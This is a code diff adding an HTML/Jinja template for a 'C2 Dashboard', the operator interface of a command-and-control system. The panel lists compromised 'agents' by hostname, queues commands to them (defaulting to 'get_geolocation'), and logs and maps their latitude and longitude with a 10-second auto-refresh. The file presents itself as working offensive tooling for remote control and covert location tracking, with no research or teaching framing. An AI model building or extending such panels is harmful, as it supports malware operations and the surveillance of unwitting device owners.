@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>C2 Dashboard</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}" />
+</head>
+<body>
+  <div class="container">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <h1>C2 Dashboard</h1>
+
+      <section>
+        <h2>Agents</h2>
+        <table>
+          <thead>
+            <tr><th>ID</th><th>Host</th><th>Last Seen</th><th>Status</th></tr>
+          </thead>
+          <tbody>
+            {% for a in agents %}
+            <tr>
+              <td class="mono" title="{{ a.agent_id }}">{{ a.agent_id[:8] }}…</td>
+              <td>{{ a.hostname }}</td>
+              <td>{{ a.last_seen }}</td>
+              <td><span class="badge {{ a.status }}">{{ a.status }}</span></td>
+            </tr>
+            {% else %}
+            <tr><td colspan="4">No agents registered.</td></tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </section>
+
+      <section>
+        <h2>Issue Command</h2>
+        <form id="cmd-form">
+          <label>Agent ID
+            <select id="cmd-agent">
+              {% for a in agents %}
+              <option value="{{ a.agent_id }}">{{ a.agent_id[:8] }}… ({{ a.hostname }})</option>
+              {% endfor %}
+            </select>
+          </label>
+          <label>Command
+            <input id="cmd-text" value="get_geolocation" />
+          </label>
+          <button type="submit">Issue</button>
+          <span id="cmd-status"></span>
+        </form>
+      </section>
+
+      <section>
+        <h2>Location Log</h2>
+        <table>
+          <thead>
+            <tr><th>Time</th><th>Agent</th><th>Lat</th><th>Lon</th><th>Acc</th></tr>
+          </thead>
+          <tbody>
+            {% for l in locations %}
+            <tr>
+              <td>{{ l.timestamp }}</td>
+              <td class="mono">{{ l.agent_id[:8] }}…</td>
+              <td>{{ l.latitude }}</td>
+              <td>{{ l.longitude }}</td>
+              <td>{{ l.accuracy }}m</td>
+            </tr>
+            {% else %}
+            <tr><td colspan="5">No locations yet.</td></tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </section>
+    </aside>
+
+    <!-- Map -->
+    <main class="map-container">
+      <div id="map"></div>
+    </main>
+  </div>
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script>
+    // ---- Map initialisation ----
+    const map = L.map('map').setView([40.0, -4.0], 3);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '&copy; OpenStreetMap contributors',
+      maxZoom: 19
+    }).addTo(map);
+
+    const markers = [];
+
+    function addMarker(lat, lon, label) {
+      const m = L.marker([lat, lon]).addTo(map);
+      m.bindPopup(label);
+      markers.push(m);
+    }
+
+    // ---- Populate initial locations ----
+    {% for l in locations %}
+    addMarker(
+      {{ l.latitude }},
+      {{ l.longitude }},
+      '<b>{{ l.agent_id[:8] }}…</b><br>{{ l.timestamp }}<br>Acc: {{ l.accuracy }}m'
+    );
+    {% endfor %}
+    if (markers.length) {
+      const group = L.featureGroup(markers);
+      map.fitBounds(group.getBounds().pad(0.3));
+    }
+
+    // ---- Issue command ----
+    document.getElementById('cmd-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const agentId = document.getElementById('cmd-agent').value;
+      const command = document.getElementById('cmd-text').value;
+      const statusEl = document.getElementById('cmd-status');
+      try {
+        const resp = await fetch('/api/issue', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({agent_id: agentId, command: command})
+        });
+        const data = await resp.json();
+        statusEl.textContent = data.status === 'issued' ? '✓ Command queued' : '✗ ' + data.message;
+      } catch (err) {
+        statusEl.textContent = '✗ ' + err.message;
+      }
+    });
+
+    // ---- Auto-refresh locations every 10 s ----
+    setInterval(async () => {
+      try {
+        const resp = await fetch('/api/locations');
+        const locs = await resp.json();
+        markers.forEach(m => map.removeLayer(m));
+        markers.length = 0;
+        locs.forEach(l => {
+          if (l.latitude != null) {
+            addMarker(l.latitude, l.longitude,
+              '<b>' + l.agent_id.substring(0,8) + '…</b><br>' + l.timestamp + '<br>Acc: ' + l.accuracy + 'm');
+          }
+        });
+      } catch (_) {}
+    }, 10000);
+  </script>
+</body>
+</html>
